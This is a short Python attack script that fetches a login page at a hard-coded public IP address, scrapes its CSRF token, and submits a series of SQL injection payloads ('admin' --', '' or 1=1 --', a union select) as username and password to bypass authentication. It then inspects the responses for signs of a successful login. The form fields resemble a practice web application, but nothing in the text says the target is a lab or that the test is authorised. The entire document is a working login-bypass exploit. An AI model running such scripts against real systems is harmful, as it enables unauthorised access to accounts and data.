
import requests
import re

session = requests.Session()

# Get token
login_page = session.get('http://31.97.117.123/login.php')
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([^'\"]+)['\"]", login_page.text)
token = token_match.group(1) if token_match else ""

print(f"Token: {token}\n")

# SQL Injection payloads to bypass login
sqli_payloads = [
    "admin' --",
    "admin' #",
    "' or '1'='1",
    "' or 1=1 --",
    "' or 1=1 #",
    "admin' or '1'='1",
    "' union select 1,1,1 --",
]

attempts = 0
for payload in sqli_payloads:
    if attempts >= 10:
        print("\n10 attempts reached, switching to different approach...")
        break
    
    attempts += 1
    
    # Re-get token for each attempt
    login_page = session.get('http://31.97.117.123/login.php')
    token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([^'\"]+)['\"]", login_page.text)
    token = token_match.group(1) if token_match else ""
    
    data = {
        'username': payload,
        'password': payload,
        'Login': 'Login',
        'user_token': token
    }
    
    response = session.post('http://31.97.117.123/login.php', data=data)
    print(f"Attempt {attempts}: {payload}")
    
    if "incorrect" not in response.text.lower() and "login" not in response.text.lower():
        print(f"✓ POTENTIAL SUCCESS - Different response!")
        if "Welcome" in response.text or "dashboard" in response.text:
            print("LOGIN SUCCESSFUL!")
            break
    
    # Check if we're getting HTML form (login page) or something else
    if "User ID" in response.text or "user_id" in response.text.lower():
        print("✓ MIGHT HAVE BYPASSED! Found user_id in response")
        print(response.text[:1000])
        break

